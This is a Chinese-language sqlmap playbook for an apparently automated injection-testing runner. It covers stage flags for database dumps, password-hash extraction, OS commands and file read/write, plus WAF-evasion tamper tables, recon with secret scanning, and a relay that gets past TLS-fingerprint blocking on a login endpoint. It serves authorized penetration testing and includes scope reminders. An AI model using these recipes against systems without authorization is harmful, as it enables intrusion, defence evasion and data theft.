# sqlmap playbook（v2 全 stage）

## Stage ↔ flag 对应

| Stage | sqlmap flag | 作用 | job 额外字段 |
|---|---|---|---|
| detect | （无枚举 flag） | injectable? 技术/DBMS/列数 | — |
| dbs | `--dbs` | 列所有库 | — |
| current-db | `--current-db` | 当前库名 | — |
| tables | `--tables` | 当前库全部表 | — |
| columns | `-T <table> --columns` | 某表列名 | `table` |
| dump | `-T <table> [-C <cols>] --dump` | 取数 | `table`，`columns` 推荐 |
| dump-all | `--dump-all` | 全库导出 | —（量大） |
| passwords | `--passwords` | 拖口令哈希 | — |
| privileges | `--privileges` | 当前用户权限 | — |
| sql-query | `--sql-query="<语句>"` | 单发 SQL | `query` |
| os-cmd | `--os-cmd="<命令>"` | 单发系统命令 | `cmd` |
| file-read | `--file-read="<路径>"` | 读目标文件 | `file_read` |
| file-write | `--file-write="<本地源>" --file-dest="<目标路径>"` | 写文件 | `file_write` + `file_dest` |

规则：一个 engagement 用一个 `--output_dir`；只有 `detect` 带 `--flush-session`（复用注入点缓存）；要重置缓存就显式重跑 detect。

**交互式 shell**：`--os-shell` / `--sql-shell` 与 `--batch` 不兼容，运行器不支持。要交互 shell：先 `--dry-run` 抄出完整命令，用户自己在终端里跑（去掉 `--batch`）。

## 请求配方

### GET 查询参数

```
-u "http://host/path?keyword=1*&from=&to=" --cookie "NB_SID=..."
```

### 参数定向（多参数 URL 只测关心的那个）

```
-p "id"
```

job 里写 `"param": "id"`。多参数 URL 不定向时 sqlmap 会把每个参数都测一遍——慢且浪费请求。

### Burp/ZAP 请求文件（复杂请求首选）

```
-r request.txt
```

job 里写 `"request_file": "request.txt"`（`*` 直接标在文件里的参数值上）。Cookie、UA、自定义头、请求体全部从文件读，job 不用重复给。适用：POST/JSON、自定义头、需要精确重放的场景。抓包：Burp 右键 → Copy to file / Save item。

### POST 表单

```
-u "http://host/vulnerabilities/sqli/" --data "id=1*&Submit=Submit" --cookie "..."
```

`--data` 即 POST；仅当站点强制时才加 `--method POST`。

### POST JSON

```
-u "http://host/api/coupon" \
  --data '{"code":"WELCOME10*"}' \
  --headers "Content-Type: application/json
X-CSRF-Token: <token>" \
  --cookie "NB_SID=..."
```

- `*` 放 JSON 字符串值内部。
- 布尔类测试需要合法基线值（如 `WELCOME10`）；空基线会让真/假响应都为空 → 假阴性。
- JSON 里要双引号时转义为 `\"`。

## 核心参数

- `--batch` 非交互；threads 由 job 控制（私网档案可 1–10，公网建议 1）。
- `--level 1–5`：payload 广度；`--risk 1–3`：侵入度（3 含 OR 类改数语句，dump/共享库慎用）。
- `--user-agent "<串>"`：UA 有 UA 规则的目标必配浏览器串（DVWA 靶机实测：非浏览器 UA 全站 403；浏览器 UA 放行）。job 字段 `user_agent`，档案预填。
- `timeout`（job 字段）：运行器单阶段超时秒数，默认 900。**隧道/公网慢目标建议 1800–3600**——实测 cloudflare tunnel 上 level 2 detect 每项技术 ~36 秒，15 分钟只够跑 1/3。
- 隧道目标节奏经验：`threads=3, delay=0.8, time_sec=8`（RTT 会吃掉时延判定窗口，本地 5 秒在隧道上偏短）。
- `--dbms` 已知库类型就写（省指纹）。
- `--delay N` 请求间隔秒；公网/限速目标 1–3。
- `--time-sec 3–10` 时延注入等待。
- `--technique B/E/U/S/T` 强制技术：B 布尔、E 报错、U UNION、S 栈查、T 时延。
- `--union-cols N` / `--union-char X`：UNION 列数与占位符（非数字 char 可避免回显假阴性）。
- `--string "<标记>"`：布尔盲注时"真"响应独有的标记。
- `--tamper a,b,c`：payload 变形脚本串。DVWA medium 常用 `space2comment`；`between` 替换比较符；组合用逗号。tamper 是 job 级字段，作用于所有 stage。
- `--output-dir`：产物根；CSV 落 `<out>/<host>/dump/<db>/`。

## WAF→tamper 映射（参考表）

来源：sqlmap 本体 `--identify-waf` 的识别结果 + 社区经验（sqlmap-ai evasion_engine 同源）。**一次别超过 3–5 个脚本**，先单独试通用款（`space2comment` / `charencode`），组合太多反而假阴性。

| WAF（`WAF: xxx` 输出） | 建议 tamper（按顺序试） |
|---|---|
| 未识别但提示有 WAF | `space2comment` → `charencode` → `between,randomcase` |
| cloudflare | `charencode` → `charunicodeencode` → `between,randomcase` |
| modsecurity | `charencode` → `charunicodeencode` → `space2comment,randomcase` |
| imperva/incapsula | `charencode` → `equaltolike,greatest` → `randomcase,between` |
| aws-waf | `between` → `charencode,randomcase` → `space2plus` |
| f5/big-ip | `charencode` → `equaltolike,greatest` → `space2comment` |
| fortinet | `between` → `charencode,randomcase` → `space2comment` |
| akamai | `charencode` → `randomcase,between` → `base64encode` |
| **DVWA 靶机的 403** | **不是 WAF，是 UA 规则**——别上 tamper，job 加浏览器 `user_agent` 即可 |

baseline 的 `WAF_DETECTED/WAF_TYPE`（签名预检）与 sqlmap 的 `WAF:` 输出（`--identify-waf` 级）都看一眼再定 tamper。

## 侦察（自动找注入点）

`scripts/recon.py` 是 detect 之前的侦察步——只浏览不攻击，产出候选注入点：

- **被动层**（默认）：BFS 爬同站链接、解析 `<form>`（action/method/字段）、robots.txt、sitemap.xml、JS 文件里的端点字符串（LinkFinder 式正则）。公网目标需一行 `--scope-note`。
- **密钥扫描**（默认开）：页面 + 内联 JS + 外链 JS，公知模式（AWS/Google/GitHub/Slack/Stripe/Twilio/SendGrid/npm/JWT/私钥/通用赋值），命中值**掩码**展示（前 6 后 2）。
- **技术栈指纹**（默认开）：Server/X-Powered-By/Set-Cookie/页面特征（nginx/PHP/Laravel/Django/Next.js/WordPress/CF…）。
- **目录发现**（`--dirs`）：~45 个高频暴露路径，200/401/403 且标题可疑的打 ★；实测能抓到纯爬取不可见的 `/health`、`/admin`。
- **CT 子域**（`--subdomains`）：crt.sh 证书透明日志枚举可注册域下的子域 → DNS 解析 → HTTP 活性探测（status+标题）。**只探测授权范围内的主机**；可注册域提取是启发式（gov.cn 类后缀特判）。
- **参数探测**（`--probe`）：对无参 GET 端点逐个试参数名（Arjun 式，内置 ~100 常用名，可 `--wordlist` 换大词表），状态码/长度差/反射三信号判活。请求量 = 词表 × 端点数，公网先用被动层。
- 输出 `candidates.json` + 排行：score = 有参数(+3)/表单(+2)/API 路径(+2)/2xx(+1)/需登录(-1)，每条带 `suggest`（可直接粘进 job 的带 `*` 目标串）。
- **选点判据**：优先 `q`/`category`/`id` 这类直接进 SQL 的检索型参数；带 `_csrf` 的 POST 表单要先处理 CSRF；标"⚠需登录"的要先补会话。

## TLS 指纹拦截与中继（2026-10-23 实战案例）

**现象**：某 Cloudflare 隧道目标，浏览器/urllib 访问全部 200，唯独 sqlmap 的请求（无论 GET/POST、带不带 Cookie/UA）一律 403，页面是应用自带的"安全校验未通过"错误页；同主机公开页（/market）却不拦。

**根因（用 TCP 管道中继抓 ClientHello 逐字节 diff 证实）**：
- sqlmap 自带 `lib/request/httpshandler.py` 用 `set_ciphers("ALL@SECLEVEL=0")` 构建 TLS 上下文，ClientHello 带 **224 字节 padding 扩展** + 全密码表 → 畸形 JA3 指纹；
- 应用/CDN 对**登录端点**按 TLS 指纹拦扫描器（公开目录页放行）；
- 附带坑：走代理时 sqlmap 的 SNI 取 `self.host`（代理地址）→ 无 SNI；且 **CSRF 令牌获取（`direct=True`）不走 `--proxy`**，直连必被拦。

**解法：本地 Plain-HTTP → Clean-TLS 中继（`scripts/tls_relay.py`）**：

```
python scripts/tls_relay.py --port 8890          # 另开一个终端常驻
sqlmap -u "http://<host>/<path>" --proxy http://127.0.0.1:8890 ...
```

- sqlmap 到中继是明文 HTTP（零 TLS 指纹），中继用标准 TLS 重新向 https:// 目标发起；
- 中继**自管会话 cookie**（解决 Secure cookie 不走 http 的问题：GET 响应的 `Set-Cookie` 进中继的袋子，后续请求自动注入）；
- job 里加 `"proxy": "http://127.0.0.1:8890"`，target 改用 `http://`。

**CSRF 表单的二次绕法**（令牌获取不走代理时）：不用 `--csrf-token`，改为自己经中继取一次真令牌写进 data：`data=_csrf=<真令牌>&email=1*&password=x`（令牌与会话绑定，中继会话不变即有效）。

**仍可能撞的墙：登录限速（429）**。登录端点对失败登录计数是正常防护，中继和令牌都绕不过它——对策是加大 `delay`、降低单轮请求数、或等窗口重置，别硬刚（见失败分诊）。

## 结果解读

- `is vulnerable` / `might be injectable` → 可注入；`does not seem to be injectable` → 不可注入。
- `Type:` / `Title:` / `Payload:` → 技术与证据（milestone 会原样摘出）。
- `back-end DBMS:` → 库类型。
- `appears to have N columns` → UNION 列数。
- `retrieved: '...'` → tables/columns/dump 过程行。
- `dumped to CSV file '...'` → CSV 产物路径。
- `fetched data logged to text files under '...'` → 日志目录。
- `passwords` 阶段输出哈希行（如 `$2y$...` / `5f4dcc...`）：把哈希串交给 hashcat；**模式号自己查 hashcat 文档，不要问 AI**。

## 失败分诊

- **302 → /login / 401** — Cookie 过期或错主机。重跑会话脚本/重取 Cookie，重跑基线。
- **403（尤其整站统一 403）** — 先排除 UA 规则：job 加浏览器 `user_agent` 重试；仍 403 才是 WAF/Cloudflare。停；问用户对策（加白/staging）。
- **429** — 限速。加 `delay`、缩范围、等窗口；公网别并发。
- **全 200 但 not injectable** — 基线空、参数错、编码/CSRF 问题。用有数据的值复核，检查 `*` 位置，`level` 提 3。
- **500 连发 + dump 空** — 应用可能截断输入或吞错误。换短载荷，问用户上限。
- **UNION 假阴性** — 列数/回显位没对上。`--union-cols N`、换 `--union-char`；布尔用 `--string`。
- **时延不稳** — 链路慢/共享。调 `--time-sec`（3–10），或换技术。

## 产物与报告

- 日志：`<output_dir>/<stage>.log`（运行器自动落盘）。
- 结构化结果：`<output_dir>/summary.json`（每 stage 自动合并，Cookie 掩码）。
- 数据：`<output_dir>/<host>/dump/<db>/<table>.csv`。
- **HTML 报告**：`python scripts/html_report.py --output-dir <dir> --title "标题"` → `<dir>/report.html`（单文件离线可交互：概要卡片/时间线/环形图/证据/dump 交互表/日志折叠/哈希高亮）。
- milestone：`STAGE / STATUS / EVIDENCE / DBMS / TABLES / ARTIFACTS / LOG / EXIT`，逐 stage 报。
- 终报要素：目标与范围、入口、请求形态、技术与 payload、暴露数据、修法、产物路径、未测项。Cookie/CSRF/个人数据掩码。
